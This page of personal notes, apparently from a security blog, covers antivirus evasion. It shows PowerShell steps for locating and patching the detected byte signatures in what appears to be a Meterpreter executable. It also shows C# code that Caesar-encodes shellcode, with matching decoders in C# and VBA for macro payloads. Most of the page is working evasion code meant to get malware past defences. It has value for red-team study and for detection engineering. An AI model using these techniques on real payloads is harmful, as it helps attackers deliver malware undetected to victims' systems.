layout: page
title: "av-evasion"
permalink: /av-evasion

# AV evasion
Falls into 2 main methods or categories

## Signature based detection
AV software scans files usually when they are downloaded or right before execution. This method relies on matching known malicious signatures to a file. 

### Locating and fixing signatures

```
Import-Module .\Find-AVSignature.ps1

Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force

# Now use clamscan to check which byte sequences are flagged
.\clamscan.exe C:\Tools\avtest1

# Change byte offset to evade av
# Sometimes modifying exact byte won't produce results and byte before or after needs to be changed.
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

### Custom shellcode encryption

#### Caesar encryption

```
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
                }
                
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
            
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
			foreach(byte b in encoded)
			{
			    hex.AppendFormat("0x{0:x2}, ", b);
			}

			Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}	
```
#### Caesar decryption
```
byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2...

for(int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}
```

#### Caesar encryption for VBA
```
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
                }


            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if(counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

#### Caesar decryption for VBA
```
For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
Next i
```